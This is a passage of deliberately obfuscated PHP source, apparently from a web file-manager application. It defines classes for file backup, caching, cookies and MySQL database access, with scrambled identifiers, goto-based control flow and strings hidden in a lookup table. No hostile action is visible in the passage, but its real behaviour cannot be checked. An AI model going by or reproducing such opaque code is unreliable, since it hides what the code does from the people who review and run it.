dóğ½•¤Ø: $D¦¦ÏÛ‚ñµ($_SERVER[$_SERVER[òÀöí][760]]); goto b°ÃÚ¦ÛÁ„; b°ÃÚ¦ÛÁ„: } class BackupFile { public function __construct() { } public function index() { goto E Éªœˆæ; Eíô‚õ”»Œ: $this->_fileFilter($b±°ŒÙ†Áâ); return !0; goto f¸§£¤õÕ; E Éªœˆæ: $BËÈÉØ´ÅÉ = Backup::get(); $a†Ëßãºß = $BËÈÉØ´ÅÉ[$_SERVER[òÀöí][289]][$_SERVER[òÀöí][173]][$_SERVER[òÀöí][436]]; $EÜ‹ä¥ĞÔÆ = array($_SERVER[òÀöí][437] => array($_SERVER[òÀöí][761], $a†Ëßãºß), $_SERVER[òÀöí][762] => array($_SERVER[òÀöí][327], $BËÈÉØ´ÅÉ[$_SERVER[òÀöí][710]])); goto C®•ˆÎñ»´; eçò°ß½Šš: $DÄ½¾óÔê = !0; $a•ÜíÕÖÛÆ = $this->storeIds(); $cš–„èˆŠ‚ = 1; goto DŸÖ˜Èµ¡Œ; A¢Œ¿¹Íî†: $C¸Ü‰á†œ = array($_SERVER[òÀöí][777] => 1, $_SERVER[òÀöí][465] => time(), $_SERVER[òÀöí][727] => 1, $_SERVER[òÀöí][774] => $a†Ëßãºß, $_SERVER[òÀöí][766] => $fĞ‹ø¿”„â, $_SERVER[òÀöí][765] => $DÈØº©ˆÁÙ); if ($fÁÏ÷Ã’½) { $C¸Ü‰á†œ[$_SERVER[òÀöí][775]] = $Aí„ÁËÖ±İ; $C¸Ü‰á†œ[$_SERVER[òÀöí][776]] = $fäàêçÕÈÉ; } Backup::set($C¸Ü‰á†œ); goto Eíô‚õ”»Œ; C®•ˆÎñ»´: $DÈØº©ˆÁÙ = (int) Model($_SERVER[òÀöí][737])->where($EÜ‹ä¥ĞÔÆ)->count($_SERVER[òÀöí][436]); $fĞ‹ø¿”„â = (int) Model($_SERVER[òÀöí][737])->where($EÜ‹ä¥ĞÔÆ)->sum($_SERVER[òÀöí][77]); $a’‡‚œ¤–² = new TaskFileTransfer($_SERVER[òÀöí][763], $_SERVER[òÀöí][732], $DÈØº©ˆÁÙ, LNG($_SERVER[òÀöí][733]) . $_SERVER[òÀöí][734] . LNG($_SERVER[òÀöí][764])); goto D‰¤˜—‚ƒ®; CŒçİİñ¤: $fäàêçÕÈÉ = $Aí„ÁËÖ±İ = 0; do { $F—´°„˜“ê = $_SERVER[òÀöí][767]; $aÁÑõ£¶å = Model($_SERVER[òÀöí][737])->where($EÜ‹ä¥ĞÔÆ)->field($F—´°„˜“ê)->order($_SERVER[òÀöí][768])->selectPage($cƒÇô”ó”, $cš–„èˆŠ‚); $E¿³¼Ä¿šÆ = !empty($aÁÑõ£¶å[$_SERVER[òÀöí][363]]) ? $aÁÑõ£¶å[$_SERVER[òÀöí][363]] : array(); foreach ($E¿³¼Ä¿šÆ as $A›˜Ù•ö±‹) { goto Bäì‰ãµšŒ; eß­›Ş¥Èá: $AÙùëâ£Š‡ += $A›˜Ù•ö±‹[$_SERVER[òÀöí][77]]; $Aí„ÁËÖ±İ += 1; $fäàêçÕÈÉ += $A›˜Ù•ö±‹[$_SERVER[òÀöí][77]]; goto F¾†÷øµ‹Ã; F¨Œ¦‡ÌÑè: if (IO::exist($b°£áâ½¦í)) { $a’‡‚œ¤–²->updateFileEnd($A›˜Ù•ö±‹[$_SERVER[òÀöí][28]], $A›˜Ù•ö±‹[$_SERVER[òÀöí][77]]); } else { $b°£áâ½¦í = get_path_father($b°£áâ½¦í); IO::mkdir($b°£áâ½¦í); if (!IO::copy($e¼ªïëÃàÖ, $b°£áâ½¦í, $_SERVER[òÀöí][771])) { write_log($_SERVER[òÀöí][772] . $e¼ªïëÃàÖ . $_SERVER[òÀöí][773] . $b°£áâ½¦í . $_SERVER[òÀöí][494], $_SERVER[òÀöí][732]); $DÄ½¾óÔê = !1; break; } } $a†Ëßãºß = $A›˜Ù•ö±‹[$_SERVER[òÀöí][436]]; $fÁÏ÷Ã’½ += 1; goto eß­›Ş¥Èá; Bäì‰ãµšŒ: if (!$this->_fileExist($A›˜Ù•ö±‹, $b±°ŒÙ†Áâ, $a•ÜíÕÖÛÆ)) { $DÈØº©ˆÁÙ -= 1; $fĞ‹ø¿”„â -= (int) $A›˜Ù•ö±‹[$_SERVER[òÀöí][77]]; write_log("\146\151\x6c\x65\x20\x6e\x6f\x74\x20\145\x78\x69\x73\164\56\146\x69\x6c\x65\x49\x44\72{$A›˜Ù•ö±‹[$_SERVER[òÀöí][436]]}\54\x20\x70\x61\x74\x68\x3a{$A›˜Ù•ö±‹[$_SERVER[òÀöí][75]]}", $_SERVER[òÀöí][769]); continue; } $e¼ªïëÃàÖ = $A›˜Ù•ö±‹[$_SERVER[òÀöí][75]]; $b°£áâ½¦í = "\x7b\x69\x6f\72{$BËÈÉØ´ÅÉ[$_SERVER[òÀöí][710]]}\175" . substr($e¼ªïëÃàÖ, strlen("\173\x69\x6f\x3a{$A›˜Ù•ö±‹[$_SERVER[òÀöí][770]]}\175")); goto F¨Œ¦‡ÌÑè; F¾†÷øµ‹Ã: if ($AÙùëâ£Š‡ >= 1024 * 1024 * 100) { $C¸Ü‰á†œ = array($_SERVER[òÀöí][774] => $a†Ëßãºß, $_SERVER[òÀöí][775] => $Aí„ÁËÖ±İ, $_SERVER[òÀöí][776] => $fäàêçÕÈÉ); Backup::set($C¸Ü‰á†œ); $AÙùëâ£Š‡ = $fÁÏ÷Ã’½ = 0; } goto e¨ÉĞ÷ÍÖ; e¨ÉĞ÷ÍÖ: } $f÷¡‹ãÂé = count($E¿³¼Ä¿šÆ); $cš–„èˆŠ‚++; } while ($f÷¡‹ãÂé == $cƒÇô”ó”); $a’‡‚œ¤–²->end(); goto A¢Œ¿¹Íî†; DŸÖ˜Èµ¡Œ: $cƒÇô”ó” = 1000; $AÙùëâ£Š‡ = $fÁÏ÷Ã’½ = 0; $b±°ŒÙ†Áâ = array(); goto CŒçİİñ¤; D‰¤˜—‚ƒ®: $a’‡‚œ¤–²->task[$_SERVER[òÀöí][717]] = $fĞ‹ø¿”„â; $C¸Ü‰á†œ = array($_SERVER[òÀöí][765] => $DÈØº©ˆÁÙ, $_SERVER[òÀöí][766] => $fĞ‹ø¿”„â); Backup::set($C¸Ü‰á†œ); goto eçò°ß½Šš; f¸§£¤õÕ: } private function _fileExist($a”´¹ºêÊ, &$B¤‘•®ù·‹, $dÁ»‚ƒ‹Û) { goto B¦Ì¶ˆ³õô; b•‘á˜„Â: if (IO::exist($b¯’Ù•ê„)) { $B¤‘•®ù·‹[] = $a”´¹ºêÊ[$fÒ…œ’ˆ±÷[436]]; return !1; } $E‘‹×øœÒ‘ = array($fÒ…œ’ˆ±÷[770] => $a”´¹ºêÊ[$fÒ…œ’ˆ±÷[770]], $fÒ…œ’ˆ±÷[75] => array($fÒ…œ’ˆ±÷[375], "{$b¯’Ù•ê„}\x25")); $D¦¢§İ¿Ÿ = Model($fÒ…œ’ˆ±÷[737])->where($E‘‹×øœÒ‘)->field($fÒ…œ’ˆ±÷[437])->select(); goto FÌÍïğè¡½; BÌñ«çğˆ½: if (!in_array($a”´¹ºêÊ[$fÒ…œ’ˆ±÷[770]], $dÁ»‚ƒ‹Û)) { return !1; } if (IO::exist($fÃĞé˜¾¦)) { return !0; } $b¯’Ù•ê„ = get_path_father($fÃĞé˜¾¦); goto b•‘á˜„Â; B¦Ì¶ˆ³õô: $fÒ…œ’ˆ±÷ =& $_SERVER[òÀöí]; $fÃĞé˜¾¦ = $a”´¹ºêÊ[$fÒ…œ’ˆ±÷[75]]; if (in_array($a”´¹ºêÊ[$fÒ…œ’ˆ±÷[436]], $B¤‘•®ù·‹)) { return !1; } goto BÌñ«çğˆ½; FÌÍïğè¡½: $B¤‘•®ù·‹ = array_merge($B¤‘•®ù·‹, array_to_keyvalue($D¦¢§İ¿Ÿ, $fÒ…œ’ˆ±÷[33], $fÒ…œ’ˆ±÷[436])); return !1; goto d¶óÒ¬ˆó¾; d¶óÒ¬ˆó¾: } private function _fileFilter($a½’ç÷ïµÀ) { $b…Ï‘ä¾¯Â =& $_SERVER[òÀöí]; if (empty($a½’ç÷ïµÀ)) { return; } $B£İ˜òà = array($b…Ï‘ä¾¯Â[436] => array($b…Ï‘ä¾¯Â[7], array_unique($a½’ç÷ïµÀ))); $B‚„¦”•Ñ¸ = Model($b…Ï‘ä¾¯Â[778])->where($B£İ˜òà)->field($b…Ï‘ä¾¯Â[387])->select(); foreach ($B‚„¦”•Ñ¸ as $A±›å¤›ÚŠ) { Model($b…Ï‘ä¾¯Â[778])->remove($A±›å¤›ÚŠ[$b…Ï‘ä¾¯Â[387]], !1); } } private function storeIds() { $BÛé²æŸ‡ß =& $_SERVER[òÀöí]; $A¦Á™ĞÌÎˆ = Model($BÛé²æŸ‡ß[722])->listData(); $AÖ‹õ´Ğé = array(); $eùŒÙÁ£‰ô = $GLOBALS[$BÛé²æŸ‡ß[6]][$BÛé²æŸ‡ß[87]][$BÛé²æŸ‡ß[779]]; foreach ($A¦Á™ĞÌÎˆ as $cø´·ãáÅ) { $EßË¾…Ë©ô = strtolower($cø´·ãáÅ[$BÛé²æŸ‡ß[93]]); if (!isset($eùŒÙÁ£‰ô[$EßË¾…Ë©ô])) { continue; } $f©¿è¤±‹ = $BÛé²æŸ‡ß[71] . (isset($eùŒÙÁ£‰ô[$EßË¾…Ë©ô]) ? $eùŒÙÁ£‰ô[$EßË¾…Ë©ô] : ucfirst($EßË¾…Ë©ô)); if (!class_exists($f©¿è¤±‹)) { continue; } $AÖ‹õ´Ğé[] = $cø´·ãáÅ[$BÛé²æŸ‡ß[385]]; } return $AÖ‹õ´Ğé; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto dÚ×ïŠÔ¯; fÛÙâİõ£: $F´«ğÚä‹ƒ = $GLOBALS[$f÷ÀğĞ»•É[6]][$f÷ÀğĞ»•É[345]]; $bß…—¸ÅôÙ = $F´«ğÚä‹ƒ[$F´«ğÚä‹ƒ[$f÷ÀğĞ»•É[780]]]; $C¡Ş§³˜¢ñ = $F´«ğÚä‹ƒ[$f÷ÀğĞ»•É[781]]; goto bËò ‚Òã‡; dÚ×ïŠÔ¯: $f÷ÀğĞ»•É =& $_SERVER[òÀöí]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto fÛÙâİõ£; bËò ‚Òã‡: switch ($F´«ğÚä‹ƒ[$f÷ÀğĞ»•É[780]]) { case $f÷ÀğĞ»•É[17]: self::$handle = Model($f÷ÀğĞ»•É[782]); break; case $f÷ÀğĞ»•É[783]: self::$handle = new CacheRedis($bß…—¸ÅôÙ, $C¡Ş§³˜¢ñ); break; case $f÷ÀğĞ»•É[784]: self::$handle = new CacheMemcached($bß…—¸ÅôÙ, $C¡Ş§³˜¢ñ); break; case $f÷ÀğĞ»•É[173]: self::$handle = new CacheFile($bß…—¸ÅôÙ, $C¡Ş§³˜¢ñ); break; default: break; } return self::$handle; goto EášÎŞÀôÑ; EášÎŞÀôÑ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($DÁÜƒº§) { if (is_array($DÁÜƒº§) || is_object($DÁÜƒº§)) { $DÁÜƒº§ = json_encode($DÁÜƒº§); } $DÁÜƒº§ = rawurlencode($DÁÜƒº§); return md5(KOD_SITE_ID . $_SERVER[òÀöí][70] . $DÁÜƒº§); } public static function get($fç§À“ˆ†) { $d“‡İì‰é§ = self::key($fç§À“ˆ†); if (!isset(self::$memoryCache[$d“‡İì‰é§])) { $e‘Ğ‚ò°« = self::init()->get($d“‡İì‰é§); self::$memoryCache[$d“‡İì‰é§] = unserialize($e‘Ğ‚ò°«); } return self::$memoryCache[$d“‡İì‰é§]; } public static function set($eÈ´‡Óî’ö, $c˜ˆë´Ì¦, $Aíœ­¡ŠÃ™ = false) { goto cæ½–Ö½ƒ; cæ½–Ö½ƒ: $DĞç©ìéÏö = self::key($eÈ´‡Óî’ö); if (isset(self::$memoryCache[$DĞç©ìéÏö]) && self::$memoryCache[$DĞç©ìéÏö] === $c˜ˆë´Ì¦) { return !0; } if ($Aíœ­¡ŠÃ™ === 0) { self::$memoryCache[$DĞç©ìéÏö] = $c˜ˆë´Ì¦; return !0; } goto f›ïÆÑ¸Ê; f›ïÆÑ¸Ê: CacheLock::lock($eÈ´‡Óî’ö); $aÆà²Üöé¡ = self::init()->set($DĞç©ìéÏö, serialize($c˜ˆë´Ì¦), $Aíœ­¡ŠÃ™); self::$memoryCache[$DĞç©ìéÏö] = $c˜ˆë´Ì¦; goto fö…¼—Î†³; fö…¼—Î†³: CacheLock::unlock($eÈ´‡Óî’ö); return $aÆà²Üöé¡; goto C†‡›‹Í”É; C†‡›‹Í”É: } public static function remove($B­Ùƒ¾÷ôì) { goto f¨í†Ã„É; B½„†Šî”‚: CacheLock::lock($B­Ùƒ¾÷ôì); $eÍß•¹Ú = self::init()->remove($F‚”¶Ù˜›À); CacheLock::unlock($B­Ùƒ¾÷ôì); goto F¾ÆŸĞ»ÇÂ; F¾ÆŸĞ»ÇÂ: return $eÍß•¹Ú; goto d§ŒÏù‚ Ú; f¨í†Ã„É: $F‚”¶Ù˜›À = self::key($B­Ùƒ¾÷ôì); unset(self::$memoryCache[$F‚”¶Ù˜›À]); self::clearTimeout(); goto B½„†Šî”‚; d§ŒÏù‚ Ú: } public static function removeMemory($cç­Šù‚õ) { $f†ËÀêî¡Â = self::key($cç­Šù‚õ); unset(self::$memoryCache[$f†ËÀêî¡Â]); } public static function clearMemory($Bš»¾Ì‰ó = false) { if ($Bš»¾Ì‰ó) { $Bš»¾Ì‰ó = self::key($Bš»¾Ì‰ó); unset(self::$memoryCache[$Bš»¾Ì‰ó]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[òÀöí][785])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[òÀöí][786])) { self::init()->clearTimeout(); } } } goto B¯ƒÃ£Ü¢‰; aŠëìáÉÓ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($A™·ÂÇ·ùœ = '', $B‰»È±™‹õ = 0) { if (is_string($A™·ÂÇ·ùœ) && $A™·ÂÇ·ùœ != $_SERVER[òÀöí][33]) { $this->prefix = $A™·ÂÇ·ùœ; } if (is_numeric($B‰»È±™‹õ) && $B‰»È±™‹õ > 0) { $this->expire = $B‰»È±™‹õ; } } public static function getInstance() { static $CØ‘èê³º­; if ($CØ‘èê³º­ === null) { $CØ‘èê³º­ = new self(); } return $CØ‘èê³º­; } private static $cookieDisable = false; public static function disable($cã½›À™Ô“) { self::$cookieDisable = $cã½›À™Ô“; } private static $sameCookieSet = array(); public static function set($A–¨Ğøß—, $A”¡ïöçâ, $CŠ¬¯£ôÁ˜ = 0, $fÑÊ„†ÉòÇ = false, $dƒÆ‰±…Ç« = false) { goto CËô®ì° È; BÏÄ„Š‡ô: if (isset(self::$sameCookieSet[$A–¨Ğøß—]) && self::$sameCookieSet[$A–¨Ğøß—] == $A”¡ïöçâ . $CŠ¬¯£ôÁ˜) { return; } self::$sameCookieSet[$A–¨Ğøß—] = $A”¡ïöçâ . $CŠ¬¯£ôÁ˜; if (!$dƒÆ‰±…Ç«) { $dƒÆ‰±…Ç« = str_replace(HOST, $c¾†”ƒÅÖÚ[33], APP_HOST); $dƒÆ‰±…Ç« = _get($GLOBALS, $c¾†”ƒÅÖÚ[823], $dƒÆ‰±…Ç«); } goto AÊÎéƒ“«¶; AÊÎéƒ“«¶: $F¡èÌÓ…†ò = $c¾†”ƒÅÖÚ[33]; setcookie($A–¨Ğøß—, $A”¡ïöçâ, time() + $CŠ¬¯£ôÁ˜, $c¾†”ƒÅÖÚ[8] . trim($dƒÆ‰±…Ç«, $c¾†”ƒÅÖÚ[8]) . $F¡èÌÓ…†ò, !1, !1, $fÑÊ„†ÉòÇ); goto Bçå–ÎõË•; CËô®ì° È: $c¾†”ƒÅÖÚ =& $_SERVER[òÀöí]; if (self::$cookieDisable) { return; } if (!$CŠ¬¯£ôÁ˜) { $CŠ¬¯£ôÁ˜ = 24 * 3600 * 7; } goto BÏÄ„Š‡ô; Bçå–ÎõË•: } public static function setSafe($C©¬œ¨­Œ , $fñÃˆßéòç, $E¤Ê³Ê“æº = 0) { self::set($C©¬œ¨­Œ , $fñÃˆßéòç, $E¤Ê³Ê“æº, !0); } public static function get($F‚çÜŒ—¦½) { return isset($_COOKIE[$F‚çÜŒ—¦½]) ? $_COOKIE[$F‚çÜŒ—¦½] : !1; } public static function remove($CÖ¥‡åÆï, $BÛÛôõÜÃŸ = false) { unset($_COOKIE[$CÖ¥‡åÆï]); self::set($CÖ¥‡åÆï, $_SERVER[òÀöí][33], 1, $BÛÛôõÜÃŸ); } } class DbMysql extends Db { public function __construct($cô‡à§Âã = '') { $B‰‡†õÖÆ§ =& $_SERVER[òÀöí]; if (!extension_loaded($B‰‡†õÖÆ§[746])) { think_exception(think_lang($B‰‡†õÖÆ§[10]) . $B‰‡†õÖÆ§[824]); } if (!empty($cô‡à§Âã)) { $this->config = $cô‡à§Âã; if (empty($this->config[$B‰‡†õÖÆ§[13]])) { $this->config[$B‰‡†õÖÆ§[13]] = $B‰‡†õÖÆ§[33]; } } } public function connect($FÊé£¤ÜÌƒ = '', $DóµóÛİˆ‰ = 0, $c²£¥ƒİ…Ë = false) { $FËè¶¦†‚ =& $_SERVER[òÀöí]; if (!isset($this->linkID[$DóµóÛİˆ‰])) { goto AùéïÁ¼¸à; C·“°ì˜ë¸: mysql_query($FËè¶¦†‚[829] . think_config($FËè¶¦†‚[830]) . $FËè¶¦†‚[55], $this->linkID[$DóµóÛİˆ‰]); if ($aæ¤ŒªîÛê > $FËè¶¦†‚[831]) { mysql_query($FËè¶¦†‚[832], $this->linkID[$DóµóÛİˆ‰]); } $this->connected = !0; goto BÆ“ó‘¶Şõ; EŒ­¾Ú¼Š¨: if ($AÆÜç½Œ ´) { $this->linkID[$DóµóÛİˆ‰] = mysql_pconnect($fĞç¦„íùÁ, $FÊé£¤ÜÌƒ[$FËè¶¦†‚[827]], $FÊé£¤ÜÌƒ[$FËè¶¦†‚[828]], 131072); } else { $this->linkID[$DóµóÛİˆ‰] = mysql_connect($fĞç¦„íùÁ, $FÊé£¤ÜÌƒ[$FËè¶¦†‚[827]], $FÊé£¤ÜÌƒ[$FËè¶¦†‚[828]], !0, 131072); } if (!$this->linkID[$DóµóÛİˆ‰] || !empty($FÊé£¤ÜÌƒ[$FËè¶¦†‚[17]]) && !mysql_select_db($FÊé£¤ÜÌƒ[$FËè¶¦†‚[17]], $this->linkID[$DóµóÛİˆ‰])) { think_exception(mysql_error()); } $aæ¤ŒªîÛê = mysql_get_server_info($this->linkID[$DóµóÛİˆ‰]); goto C·“°ì˜ë¸; BÆ“ó‘¶Şõ: if (1 != think_config($FËè¶¦†‚[18])) { unset($this->config); } goto BŒÀ¹ÅÒ‘ƒ; AùéïÁ¼¸à: if (empty($FÊé£¤ÜÌƒ)) { $FÊé£¤ÜÌƒ = $this->config; } $fĞç¦„íùÁ = $FÊé£¤ÜÌƒ[$FËè¶¦†‚[825]] . ($FÊé£¤ÜÌƒ[$FËè¶¦†‚[826]] ? "\x3a{$FÊé£¤ÜÌƒ[$FËè¶¦†‚[826]]}" : $FËè¶¦†‚[33]); $AÆÜç½Œ ´ = !empty($FÊé£¤ÜÌƒ[$FËè¶¦†‚[13]][$FËè¶¦†‚[14]]) ? $FÊé£¤ÜÌƒ[$FËè¶¦†‚[13]][$FËè¶¦†‚[14]] : $this->pconnect; goto EŒ­¾Ú¼Š¨; BŒÀ¹ÅÒ‘ƒ: } return $this->linkID[$DóµóÛİˆ‰]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($DËÔœÛ°±ñ) { goto cë‡„ï†Ù; cë‡„ï†Ù: $d§´÷æ³¬² =& $_SERVER[òÀöí]; if (0 === stripos($DËÔœÛ°±ñ, $d§´÷æ³¬²[260])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto e•ø ôÙÈ©; e•ø ôÙÈ©: if (!$this->_linkID) { return !1; } $this->queryStr = $DËÔœÛ°±ñ; if ($this->queryID) { $this->free(); } goto F è¤âËù; bİß»«äÃ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto C‹ ØŠĞÈƒ; F è¤âËù: think_action_status($d§´÷æ³¬²[19], 1); think_status($d§´÷æ³¬²[20]); $this->queryID = mysql_query($DËÔœÛ°±ñ, $this->_linkID); goto bİß»«äÃ; C‹ ØŠĞÈƒ: } public function execute($FìŠÏœĞ¯Â) { goto Fº¡¿ÍÈÍ; B·Üæ¼Â: $this->queryStr = $FìŠÏœĞ¯Â; if ($this->queryID) { $this->free(); } think_action_status($B¨ƒ¥†Å¸¦[21], 1); goto dÉ›¨¤Ö‚¥; fš¼—‘ĞóÑ: if (!1 === $d¹œ½’÷ˆ¢) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto D¸•ØôÚÛÑ; Fº¡¿ÍÈÍ: $B¨ƒ¥†Å¸¦ =& $_SERVER[òÀöí]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B·Üæ¼Â; dÉ›¨¤Ö‚¥: think_status($B¨ƒ¥†Å¸¦[20]); $d¹œ½’÷ˆ¢ = mysql_query($FìŠÏœĞ¯Â, $this->_linkID); $this->debug(); goto fš¼—‘ĞóÑ; D¸•ØôÚÛÑ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[òÀöí][833], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D‡À£÷¿ì¥ = mysql_query($_SERVER[òÀöí][834], $this->_linkID); $this->transTimes = 0; if (!$D‡À£÷¿ì¥) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $B‚£êë©‰• = mysql_query($_SERVER[òÀöí][835], $this->_linkID); $this->transTimes = 0; if (!$B‚£êë©‰•) { $this->error(); return !1; } } return !0; } private function getAll() { $aÄõñæğ·à = array(); if ($this->numRows > 0) { while ($C¾‹½ß Ë = mysql_fetch_assoc($this->queryID)) { $aÄõñæğ·à[] = $C¾‹½ß Ë; } mysql_data_seek($this->queryID, 0); } return $aÄõñæğ·à; } public function getFields($cÊ»¡¶Í) { $eÀ¸•Õ´“À =& $_SERVER[òÀöí]; $bŠ×é²œĞß = $this->query($eÀ¸•Õ´“À[836] . $this->parseKey($cÊ»¡¶Í)); $B‹ÈÀÌ»Ç† = array(); if ($bŠ×é²œĞß) { foreach ($bŠ×é²œĞß as $b¨õºù¯Ï => $f‡Ò‰²²Á) { $B‹ÈÀÌ»Ç†[$f‡Ò‰²²Á[$eÀ¸•Õ´“À[27]]] = array($eÀ¸•Õ´“À[28] => $f‡Ò‰²²Á[$eÀ¸•Õ´“À[27]], $eÀ¸•Õ´“À[29] => $f‡Ò‰²²Á[$eÀ¸•Õ´“À[30]], $eÀ¸•Õ´“À[31] => (bool) (strtoupper($f‡Ò‰²²Á[$eÀ¸•Õ´“À[32]]) === $eÀ¸•Õ´“À[837]), $eÀ¸•Õ´“À[34] => $f‡Ò‰²²Á[$eÀ¸•Õ´“À[35]], $eÀ¸•Õ´“À[36] => strtolower($f‡Ò‰²²Á[$eÀ¸•Õ´“À[37]]) == $eÀ¸•Õ´“À[38], $eÀ¸•Õ´“À[39] => strtolower($f‡Ò‰²²Á[$eÀ¸•Õ´“À[40]]) == $eÀ¸•Õ´“À[41]); } } return $B‹ÈÀÌ»Ç†; } public function getTables($b›ÎÓ§Œ = '') { $c÷ª¶Å‘îô =& $_SERVER[òÀöí]; if (!empty($b›ÎÓ§Œ)) { $bâ©˜ÇËÛğ = $c÷ª¶Å‘îô[838] . $b›ÎÓ§Œ . $c÷ª¶Å‘îô[839]; } else { $bâ©˜ÇËÛğ = $c÷ª¶Å‘îô[840]; } $BøÏø™¸¿¹ = $this->query($bâ©˜ÇËÛğ); $FâéõÄƒŠù = array(); foreach ($BøÏø™¸¿¹ as $B·‰¨Ç–Ê => $AÍ¿‚‘²‡·) { $FâéõÄƒŠù[$B·‰¨Ç–Ê] = current($AÍ¿‚‘²‡·); } return $FâéõÄƒŠù; } public function replace($a¹àåÃêø÷, $Eˆ‹ÆéÕÇô = array()) { $eÑß…å‡ë =& $_SERVER[òÀöí]; foreach ($a¹àåÃêø÷ as $DÁ©Ó”˜™Ö => $D—‹Î‡ÔĞ) { $fÙ‰˜×œÕÑ = $this->parseValue($D—‹Î‡ÔĞ); if (is_scalar($fÙ‰˜×œÕÑ)) { $b§“ìÓ›¶[] = $fÙ‰˜×œÕÑ; $C·½ÃµŸ¤‡[] = $this->parseKey($DÁ©Ó”˜™Ö); } } $F‘®óÏğ¿ƒ = $eÑß…å‡ë[841] . $this->parseTable($Eˆ‹ÆéÕÇô[$eÑß…å‡ë[275]]) . $eÑß…å‡ë[842] . implode($eÑß…å‡ë[47], $C·½ÃµŸ¤‡) . $eÑß…å‡ë[843] . implode($eÑß…å‡ë[47], $b§“ìÓ›¶) . $eÑß…å‡ë[844]; return $this->execute($F‘®óÏğ¿ƒ); } public function insertAll($b¶ãˆÏáÉ, $aª‡¨À¡õ¤ = array(), $d ë•Á²…³ = false) { goto cé·‘Ê’‰; f™‡êÀÓÔè: $Dò„íÀ¼¹ = array(); foreach ($b¶ãˆÏáÉ as $f†”°ï³¸ ) { $AÌïÆ‘‚íÊ = array(); foreach ($f†”°ï³¸  as $BÇ­š‚Ëï² => $e Ì¾ÅŠª‘) { $e Ì¾ÅŠª‘ = $this->parseValue($e Ì¾ÅŠª‘); if (is_scalar($e Ì¾ÅŠª‘)) { $AÌïÆ‘‚íÊ[] = $e Ì¾ÅŠª‘; } } $Dò„íÀ¼¹[] = $e¹Ô²±í¿[256] . implode($e¹Ô²±í¿[47], $AÌïÆ‘‚íÊ) . $e¹Ô²±í¿[844]; } array_walk($eÄÂíŒÙ©, array($this, $e¹Ô²±í¿[845])); goto bŸÚ…¦„Ìî; cé·‘Ê’‰: $e¹Ô²±í¿ =& $_SERVER[òÀöí]; if (!is_array($b¶ãˆÏáÉ[0])) { return !1; } $eÄÂíŒÙ© = array_keys($b¶ãˆÏáÉ[0]); goto f™‡êÀÓÔè; bŸÚ…¦„Ìî: $AŠí¤áÙÌƒ = ($d ë•Á²…³ ? $e¹Ô²±í¿[846] : $e¹Ô²±í¿[847]) . $e¹Ô²±í¿[848] . $this->parseTable($aª‡¨À¡õ¤[$e¹Ô²±í¿[275]]) . $e¹Ô²±í¿[842] . implode($e¹Ô²±í¿[47], $eÄÂíŒÙ©) . $e¹Ô²±í¿[849] . implode($e¹Ô²±í¿[47], $Dò„íÀ¼¹); return $this->execute($AŠí¤áÙÌƒ); goto E•Èùæ‰´ò; E•Èùæ‰´ò: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $E…î«ŠìÙ =& $_SERVER[òÀöí]; $this->error = mysql_errno() . $E…î«ŠìÙ[4] . mysql_error($this->_linkID); if ($E…î«ŠìÙ[33] != $this->queryStr) { $this->error .= LNG($E…î«ŠìÙ[45]) . $this->queryStr; } think_trace($this->error, $E…î«ŠìÙ[33], $E…î«ŠìÙ[46]); return $this->error; } public function escapeString($Eô£÷‹æ›‚) { if ($this->_linkID) { return mysql_real_escape_string($Eô£÷‹æ›‚, $this->_linkID); } else { return mysql_escape_string($Eô£÷‹æ›‚); } } public function parseKey(&$AšÖğ´ØÄò, $cèÁ„Ù“˜ = true) { $f‚ŞÂ‚•Â =& $_SERVER[òÀöí]; if ($cèÁ„Ù“˜) { $AšÖğ´ØÄò = $this->parseKeyCheck($AšÖğ´ØÄò); } if ($AšÖğ´ØÄò != $f‚ŞÂ‚•Â[182] && !preg_match($f‚ŞÂ‚•Â[850], $AšÖğ´ØÄò)) { $AšÖğ´ØÄò = $f‚ŞÂ‚•Â[377] . trim($AšÖğ´ØÄò, $f‚ŞÂ‚•Â[377]) . $f‚ŞÂ‚•Â[377]; } return $AšÖğ´ØÄò; } } class DbMysqli extends Db { public function __construct($cÄÉï±› = '') { $C’õŞ„Ÿ› =& $_SERVER[òÀöí]; if (!extension_loaded($C’õŞ„Ÿ›[745])) { think_exception(think_lang($C’õŞ„Ÿ›[10]) . $C’õŞ„Ÿ›[851]); } if (!empty($cÄÉï±›)) { $this->config = $cÄÉï±›; if (empty($this->config[$C’õŞ„Ÿ›[13]])) { $this->config[$C’õŞ„Ÿ›[13]] = $C’õŞ„Ÿ›[33]; } } } public function connect($Aøâšé¥ï = '', $b½ÑÊ¬„ • = 0) { $FŸù•Ş· =& $_SERVER[òÀöí]; if (!isset($this->linkID[$b½ÑÊ¬„ •])) { goto cäÁ›™•‹²; cäÁ›™•‹²: if (empty($Aøâšé¥ï)) { $Aøâšé¥ï = $this->config; } $this->linkID[$b½ÑÊ¬„ •] = new mysqli($Aøâšé¥ï[$FŸù•Ş·[825]], $Aøâšé¥ï[$FŸù•Ş·[827]], $Aøâšé¥ï[$FŸù•Ş·[828]], $Aøâšé¥ï[$FŸù•Ş·[17]], $Aøâšé¥ï[$FŸù•Ş·[826]] ? intval($Aøâšé¥ï[$FŸù•Ş·[826]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto Aïèƒ¦’ÌĞ; AŠùë´ŠÓ: $this->connected = !0; if (1 != think_config($FŸù•Ş·[18])) { unset($this->config); } goto CöÚé…–½; 